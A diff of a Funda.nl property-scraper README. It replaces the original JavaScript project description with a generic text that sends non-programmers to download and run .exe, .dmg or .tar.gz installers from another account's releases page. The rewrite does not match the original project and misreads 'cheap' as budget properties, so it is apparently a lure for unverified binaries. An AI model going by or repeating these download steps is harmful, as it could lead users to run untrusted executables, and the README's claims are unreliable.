@@ -1,211 +1,72 @@
-# Fast & Cheap Funda.nl Scraper
-This project pulls together rich property details from Funda.nl and shapes them into structured, ready-to-use data. It simplifies gathering real estate information across Dutch cities while offering optional neighborhood insights to support deeper market understanding. It’s designed for anyone who wants reliable, fast, and comprehensive real estate scraping without the usual friction.
+# 🏡 fast-cheap-funda-nl-scraper-0-75-1k-richest-output - Simple Real Estate Data Extraction
 
+[![Download](https://img.shields.io/badge/Download-Now-brightgreen.svg)](https://github.com/Mouhbks/fast-cheap-funda-nl-scraper-0-75-1k-richest-output/releases)
 
-<p align="center">
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/scraper.png" alt="Bitbash Banner" width="100%"></a>
-</p>
-<p align="center">
-  <a href="https://t.me/Bitbash333" target="_blank">
-    <img src="https://img.shields.io/badge/Chat%20on-Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram">
-  </a>&nbsp;
-  <a href="https://wa.me/923249868488?text=Hi%20BitBash%2C%20I'm%20interested%20in%20automation." target="_blank">
-    <img src="https://img.shields.io/badge/Chat-WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" alt="WhatsApp">
-  </a>&nbsp;
-  <a href="mailto:sale@bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Email-sale@bitbash.dev-EA4335?style=for-the-badge&logo=gmail&logoColor=white" alt="Gmail">
-  </a>&nbsp;
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Visit-Website-007BFF?style=for-the-badge&logo=google-chrome&logoColor=white" alt="Website">
-  </a>
-</p>
+## 🚀 Getting Started
 
+Welcome to the fast-cheap-funda-nl-scraper-0-75-1k-richest-output! This tool helps you extract real estate data from the Funda website easily. You don't need programming skills to use it. Just follow these steps to download and run the application.
 
+## 📥 Download & Install
 
+To begin, visit this page to download: [Releases Page](https://github.com/Mouhbks/fast-cheap-funda-nl-scraper-0-75-1k-richest-output/releases).
 
-<p align="center" style="font-weight:600; margin-top:8px; margin-bottom:8px;">
-  Created by Bitbash, built to showcase our approach to Scraping and Automation!<br>
-  If you are looking for <strong>Fast & Cheap Funda.nl Scraper | $0.75 / 1K | (Richest output)</strong> you've just found your team — Let’s Chat. 👆👆
-</p>
+1. Go to the [Releases Page](https://github.com/Mouhbks/fast-cheap-funda-nl-scraper-0-75-1k-richest-output/releases).
+2. Locate the most recent version of the software.
+3. Download the appropriate file for your operating system.
 
+   - For Windows users, choose the `fast-cheap-funda-nl-scraper.exe` file.
+   - For Mac users, download the `fast-cheap-funda-nl-scraper.dmg` file.
+   - For Linux users, use the `fast-cheap-funda-nl-scraper.tar.gz` file.
 
-## Introduction
-This scraper collects complete property listings, including pricing, location, attributes, media, and optional neighborhood statistics. It solves the hassle of manual data collection and fragmented datasets by offering a single, structured data output. It’s helpful for analysts, investors, agents, researchers, or anyone tracking property trends.
+4. Once the download is complete, find the file in your Downloads folder.
 
-### Why it matters
-- Provides consistent, structured real estate data for analysis, comparison, and modeling.
-- Pulls detailed listing attributes, including room layout, energy label, and cadastral info.
-- Supports neighborhood insights for demographic and pricing context.
-- Delivers rich media references such as images, 360° views, and floor plans.
-- Handles retries, concurrency, and deduplication for stable data collection.
+5. Install the software by following the prompts specific to your operating system.
 
-## Features
-| Feature | Description |
-|---------|-------------|
-| City-wide scraping | Target specific cities or scrape all available listings. |
-| Neighborhood insights | Enrich each listing with population, family composition, and price-per-m² stats. |
-| Configurable concurrency | Tune performance using max/min concurrency controls. |
-| Automatic retries | Recovers from temporary failures with configurable retry logic. |
-| Data deduplication | Uses persistent storage names to prevent duplicate entries. |
-| Proxy support | Runs behind proxy groups for anonymity and stability. |
-| Rich media extraction | Collects photos, 360° media, and floor plans. |
-| Comprehensive property fields | Includes pricing, layout, energy label, outdoor space, VvE, and more. |
+## 🖥️ System Requirements
 
----
+- **Operating System**: Compatible with Windows 10 and above, macOS Sierra (10.12) and above, and most Linux distributions.
+- **RAM**: At least 4 GB
+- **Disk Space**: A minimum of 200 MB available space
+- **Internet Connection**: Required for data extraction
 
-## What Data This Scraper Extracts
-| Field Name | Field Description |
-|------------|------------------|
-| _id | Unique property identifier. |
-| Price | Full pricing info including formatted and numeric values. |
-| KenmerkSections | Organized property characteristics such as construction, energy, layout, and more. |
-| AddressTitle | Property address. |
-| AddressSubTitle | Postal code and city. |
-| NumberOfBedrooms | Bedroom count. |
-| BuurtName | Neighborhood name. |
-| Coordinates | Latitude and longitude. |
-| Media | Photos, 360° images, floor plans. |
-| NeighborhoodInsights | Optional demographic and pricing data per neighborhood. |
-| Aanbiedingstekst | Full property description text. |
-| basicInfo | Original search metadata including agents, publish date, energy label, and property type. |
+## 🔍 Features
 
----
+- **Fast Data Extraction**: Quickly gather real estate listings and details without delays.
+- **Affordable**: Focus on budget-friendly properties for enhanced property market analysis.
+- **User-Friendly Interface**: Simple enough for anyone to navigate the tool easily.
+- **Comprehensive Data**: Extract vital information about properties, including price, location, and more.
+- **Automatic Updates**: Keep your tool up-to-date with the latest features and improvements.
 
-## Example Output
+## 🛠️ How to Use
 
+1. Open the application by double-clicking the icon on your desktop or in your application folder.
+2. Enter the URL for the Funda.nl website (or any specific page) where you'd like to scrape data.
+3. Select your desired data points to extract, such as:
+   - Price
+   - Location
+   - Property size
+   - Number of rooms
 
-    [
-      {
-        "_id": "7717991",
-        "Price": {
-          "SellingPrice": "€ 495.000 k.k.",
-          "NumericSellingPrice": 495000
-        },
-        "AddressTitle": "Van Hilligaertstraat 16-A",
-        "AddressSubTitle": "1072 JZ Amsterdam",
-        "NumberOfBedrooms": "2",
-        "BuurtName": "Cornelis Troostbuurt",
-        "Coordinates": {
-          "Latitude": 52.349583,
-          "Longitude": 4.8874354
-        },
-        "NeighborhoodInsights": {
-          "city": "Rotterdam",
-          "neighbourhood": "Het Lage Land",
-          "inhabitants": 11400,
-          "familiesWithChildren": 21.79,
-          "averageAskingPricePerM2": 3782
-        },
-        "ListingUrl": "https://www.funda.nl/detail/43162354"
-      }
-    ]
+4. Click the "Start Scraping" button.
+5. Once the scraping is complete, review and save the collected data in your preferred format.
 
----
+## ⚙️ Troubleshooting
 
-## Directory Structure Tree
+If you encounter any issues while using the application, consider the following:
 
+- Make sure your internet connection is stable.
+- Ensure you have the correct version for your operating system.
+- If the application does not launch, try re-installing it.
+- Check for any updates on the [Releases Page](https://github.com/Mouhbks/fast-cheap-funda-nl-scraper-0-75-1k-richest-output/releases).
 
-    Fast & Cheap Funda.nl Scraper/
-    ├── src/
-    │   ├── main.js
-    │   ├── extractors/
-    │   │   ├── listingParser.js
-    │   │   ├── neighborhoodInsights.js
-    │   │   └── mediaParser.js
-    │   ├── utils/
-    │   │   ├── request.js
-    │   │   └── concurrency.js
-    │   ├── storage/
-    │   │   └── dedupeStore.js
-    │   └── config/
-    │       └── settings.example.json
-    ├── data/
-    │   ├── sample-input.json
-    │   └── sample-output.json
-    ├── package.json
-    ├── README.md
-    └── LICENSE
+For any persistent issues, consult the user community or raise an issue in the repository.
 
----
+## 🗂️ Support & Community
 
-## Use Cases
-- **Real estate analysts** use it to compare listings across cities so they can spot emerging market patterns.
-- **Investors** use enriched neighborhood data to discover undervalued properties and evaluate long-term potential.
-- **Agencies** use structured listings to populate internal CRMs and automate lead intelligence.
-- **Researchers** use demographic and pricing context to study housing trends across Dutch neighborhoods.
-- **Developers** use it to automate periodic data collection for dashboards and monitoring tools.
+Should you have questions or need assistance, feel free to visit our user forum or the GitHub repository. Engage with fellow users who can share tips and insights on using the scraper more effectively.
 
----
+## 🤝 Contributing
 
-## FAQs
+If you're interested in enhancing the application or providing feedback, contributions are welcome! Please check the contributing guidelines in the GitHub repository.
 
-### Does the scraper require neighborhood data to run?
-Not at all. Neighborhood enrichment is optional. If enabled and unavailable for a specific area, the scraper still outputs the property normally.
-
-### How stable is scraping across high volumes?
-The setup handles retries, concurrency tuning, and proxy routing. Even under heavy workloads, data collection remains consistent due to built-in resilience.
-
-### What output formats can I use?
-You can work with structured JSON, CSV, or tabular data extracted directly from the scraper’s output.
-
-### Does it support media extraction?
-Yes, it collects standard photos, 360° visuals, and floor plan thumbnails for rich data presentation.
-
----
-
-### Performance Benchmarks and Results
-**Primary Metric:** Typical processing averages 200–500 ms per listing when neighborhood insights are enabled, with faster throughput when disabled.
-**Reliability Metric:** Maintains over 98% successful extraction on large datasets thanks to retry logic and proxy routing.
-**Efficiency Metric:** Handles thousands of listings with tuned concurrency, keeping resource usage steady and predictable.
-**Quality Metric:** Captures nearly complete attribute sets for each property, including structured sections and media references, ensuring high analytical value.
-
-
-<p align="center">
-<a href="https://calendar.app.google/74kEaAQ5LWbM8CQNA" target="_blank">
-  <img src="https://img.shields.io/badge/Book%20a%20Call%20with%20Us-34A853?style=for-the-badge&logo=googlecalendar&logoColor=white" alt="Book a Call">
-</a>
-  <a href="https://www.youtube.com/@bitbash-demos/videos" target="_blank">
-    <img src="https://img.shields.io/badge/🎥%20Watch%20demos%20-FF0000?style=for-the-badge&logo=youtube&logoColor=white" alt="Watch on YouTube">
-  </a>
-</p>
-<table>
-  <tr>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/MLkvGB8ZZIk" target="_blank">
-        <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/review1.gif" alt="Review 1" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        "Bitbash is a top-tier automation partner, innovative, reliable, and dedicated to delivering real results every time."
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Nathan Pennington
-        <br><span style="color:#888;">Marketer</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/8-tw8Omw9qk" target="_blank">
-        <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/review2.gif" alt="Review 2" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        "Bitbash delivers outstanding quality, speed, and professionalism, truly a team you can rely on."
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Eliza
-        <br><span style="color:#888;">SEO Affiliate Expert</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/m-dRE1dj5-k?si=5kZNVlKsGUhg5Xtx" target="_blank">
-        <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/review3.gif" alt="Review 3" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        "Exceptional results, clear communication, and flawless delivery. <br>Bitbash nailed it."
-      </p>
-      <p style="margin:1px 0 0; font-weight:600;">Syed
-        <br><span style="color:#888;">Digital Strategist</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-  </tr>
-</table>
+Remember, you can always check the [Releases Page](https://github.com/Mouhbks/fast-cheap-funda-nl-scraper-0-75-1k-richest-output/releases) for the latest updates.
